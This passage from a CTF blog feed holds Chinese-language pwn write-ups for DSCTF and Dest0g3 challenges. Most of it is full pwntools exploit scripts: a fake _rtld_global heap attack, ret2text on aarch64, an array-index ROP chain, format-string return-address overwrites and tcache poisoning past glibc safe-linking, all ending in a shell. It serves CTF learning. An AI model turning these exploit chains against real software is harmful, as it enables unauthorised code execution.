<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">ip = <span class="string">&#x27;43.142.31.245&#x27;</span></span><br><span class="line">port = <span class="number">28107</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr : log.info(addr)</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, con = <span class="string">b&#x27;aaaa&#x27;</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Content: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x430</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x430</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x430</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x430</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x430</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0xca1</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x430</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libcbase = uu64() - <span class="number">0x219ce0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">environ = libcbase + <span class="number">0x221200</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#heap3 &amp;&amp; chunk1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">b&#x27;:\n&#x27;</span>)</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#1 and 2 uaf</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x870</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#to large bin </span></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&#x27;Leof&#x27;</span>)    <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">rtld_global = libcbase + <span class="number">0x264040</span></span><br><span class="line">heap_addr = key &lt;&lt; <span class="number">12</span></span><br><span class="line">payload = p64(libcbase + <span class="number">0x21a0e0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(rtld_global - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&#x27;Leof&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rtld_global))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">setcontext = libcbase + <span class="number">0x53A6D</span>         <span class="comment">#mov     rsp, [rdx+0A0h]</span></span><br><span class="line">ret = setcontext + <span class="number">0x14e</span> - <span class="number">61</span></span><br><span class="line">pop_rdi = libcbase + <span class="number">0x2a3e5</span></span><br><span class="line">sh = libcbase + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">fake_rtld_global_addr = heap_addr + <span class="number">0xb90</span></span><br><span class="line">fake_rtld_global = p64(<span class="number">0</span>) + p64(libcbase + <span class="number">0x265890</span>) + p64(<span class="number">0</span>) + p64(fake_rtld_global_addr)</span><br><span class="line">fake_rtld_global += p64(setcontext) + p64(ret)</span><br><span class="line">fake_rtld_global += p64(sh)</span><br><span class="line">fake_rtld_global += p64(ret)</span><br><span class="line">fake_rtld_global += p64(sys_addr)</span><br><span class="line">fake_rtld_global += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x80</span></span><br><span class="line">fake_rtld_global += p64(fake_rtld_global_addr + <span class="number">0x28</span> + <span class="number">0x18</span>)</span><br><span class="line">fake_rtld_global += p64(pop_rdi)</span><br><span class="line">fake_rtld_global += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x100</span> - <span class="built_in">len</span>(fake_rtld_global))</span><br><span class="line">fake_rtld_global += p64(fake_rtld_global_addr + <span class="number">0x10</span> + <span class="number">0x110</span>) * <span class="number">3</span></span><br><span class="line">fake_rtld_global += p64(<span class="number">0x10</span>)</span><br><span class="line">fake_rtld_global += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x31c</span> - <span class="number">0x10</span> - <span class="built_in">len</span>(fake_rtld_global))</span><br><span class="line">fake_rtld_global += p8(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, fake_rtld_global)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x400</span> + p64(fake_rtld_global_addr + <span class="number">0x20</span>))</span><br><span class="line">sa(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>DSCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Dest0g3-520-迎新赛-pwn</title>
    <url>/2022/06/15/Dest0g3-520-%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn/</url>
    <content><![CDATA[<p>Dest0g3 520 迎新赛部分pwn题复现</p>
<span id="more"></span>

<h1 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h1><p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100914258.jpg" alt="Xo0R9f.jpg"></p>
<p>aarch64架构的ret2text，除了canary全开了</p>
<p>运行程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./stack</span><br></pre></td></tr></table></figure>

<p>用gdb-multiarch调试确定溢出长度</p>
<p>先将程序在指定端口跑起来</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu/ ./stack</span><br></pre></td></tr></table></figure>

<p>gdb-multiarch调试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./stack</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote localhost:1234</span></span><br></pre></td></tr></table></figure>

<p>按c继续运行程序，用pwntools生成字符串并输入到qemu运行的程序中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cyclic(<span class="number">100</span>)</span><br></pre></td></tr></table></figure>

<p>此时再回到gdb</p>
<p><a href="https://imgtu.com/i/XoBcqJ"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100915010.jpg" alt="XoBcqJ.jpg"></a></p>
<p>可以看到PC寄存器已经改成了kaaalaa，用pwntools确定偏移</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cyclic_find(<span class="string">&quot;kaaalaa&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><a href="https://imgtu.com/i/XoBzz8"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100915526.jpg" alt="XoBzz8.jpg"></a></p>
<p>得到偏移为40</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26474</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please leave your name:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;\x3c&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h1><p>32位数组溢出</p>
<p><a href="https://imgtu.com/i/XTJgTf"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100915952.jpg" alt="XTJgTf.jpg"></a></p>
<p>这里输入数组长度的时候用了abs取绝对值，所以可以-1得到一个很大的值</p>
<p>数组溢出可以参考这篇：<a href="https://bbs.pediy.com/thread-228652.htm">数组溢出</a></p>
<p>然后gdb调试得到表示数组下标的地方，改成到返回地址的偏移然后和正常的rop一样泄露libc，getshell一样的操作覆盖返回地址和传参就行</p>
<p>需要注意的是输入数组用的是%d，最大值为0xffffffff，所以最后输入system或者one_gadget的时候要输入负数</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./ez_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;, 26389)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ez_pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(io, &quot;b* 0x8049342&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">num</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input your choice:&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input num&quot;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input the length of array:&quot;</span>, <span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0xffffffff</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xffffffff</span>)</span><br><span class="line">add(<span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x11</span>)</span><br><span class="line">add(elf.plt[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">add(<span class="number">0x8049216</span>)</span><br><span class="line">add(elf.got[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input your choice:&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">puts_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr: &quot;</span>, <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">sh = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">one = libcbase + <span class="number">0x3d2a5</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input the length of array:&quot;</span>, <span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0xffffffff</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xffffffff</span>)</span><br><span class="line">add(<span class="number">0x1</span>)</span><br><span class="line">add(<span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#add(-(0xffffffff - one + 1))</span></span><br><span class="line">add(-(<span class="number">0xffffffff</span> - sys_addr + <span class="number">1</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(-(<span class="number">0xffffffff</span> - sh + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input your choice:&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="dest-love"><a href="#dest-love" class="headerlink" title="dest_love"></a>dest_love</h1><p><a href="https://imgtu.com/i/XTdpoq"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100915614.jpg" alt="XTdpoq.jpg"></a></p>
<p>格式化字符串漏洞，让dword_4010&#x3D;&#x3D;1314520就可以getshell，但是这个值不在栈上，所以就之间格式化字符串改返回地址为one_gadget了</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(io, &quot;b* $rebase(0x1204)&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">io.recvline()</span><br><span class="line">io.send(<span class="string">b&quot;%9$p&quot;</span>)</span><br><span class="line">libc_start_main = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">213</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__libc_start_main&quot;</span>, libc_start_main)</span><br><span class="line">libcbase = libc_start_main - libc.dump(<span class="string">&quot;__libc_start_main&quot;</span>)</span><br><span class="line">one = libcbase + <span class="number">0xde78f</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xde78c execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xde78f execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xde792 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(one))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak stack</span></span><br><span class="line">io.recvline()</span><br><span class="line">io.send(<span class="string">b&quot;%10$p&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0xf8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;What about your love to Dest0g3?\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(stack + <span class="number">8</span> &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%10$hnxxxx\x00&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;What about your love to Dest0g3?\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(one &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%39$hnxxxx\x00&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;What about your love to Dest0g3?\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(stack + <span class="number">10</span> &amp; <span class="number">0xffff</span>)+ <span class="string">&quot;c&quot;</span> +<span class="string">&quot;%10$hnxxxx\x00&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(one &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%39$hnxxxx\x00&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h1><p>题目是很常见的菜单题，漏洞也很明显，就是一个uaf，这里主要是学习了一下glibc-2.33新引进的防护进制：safe-linking</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span></span><br><span class="line"><span class="comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="comment">/* 加密函数 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="comment">/* 解密函数 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>

<p>整体的一个加密方式就是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p-&gt;fd = ((&amp;p-&gt;fd)&gt;&gt;<span class="number">12</span>) ^ REVEAL_PTR(p-&gt;fd)</span><br></pre></td></tr></table></figure>

<p>当前堆块的fd会等于当前堆块地址 &gt;&gt; 12 ^ 原fd（相邻先被释放的堆块地址）</p>
<p>创建两个堆块然后free进tcache 中</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100916207.jpg" alt="img"></p>
<p>接下来按上面的公式来算一下</p>
<p>第一个被释放的堆块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fd = (0x55555555b2a0 &gt;&gt; 12) ^ 0</span><br></pre></td></tr></table></figure>

<p>第二个被释放的堆块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fd = (0x55555555b2c0 &gt;&gt; 12) ^ 0x55555555b2a0</span><br></pre></td></tr></table></figure>

<p>这里可以直接理解为新的fd为当前堆的data区域的地址异或上一个key，而这个key即是第一个free进tcachebins中的堆块的data区域地址&gt;&gt;12得到</p>
<p>所以2.33版本以上的uaf只是比平常的攻击多了个异或key的过程，key的值可以通过泄露第一个free的堆块的fd来得到</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25982</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Please tell me its size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Please tell me the index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Please tell me its content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Please tell me the index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Please tell me the index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">key = u64(io.recvuntil(<span class="string">&#x27;\x05&#x27;</span>)[<span class="number">2</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;key:&#x27;</span>, <span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">2</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;malloc_hook:&#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>, malloc_hook)</span><br><span class="line">libcbase = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">free_hook = libcbase + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#6 9</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(key ^ free_hook)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, p64(sys_addr))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
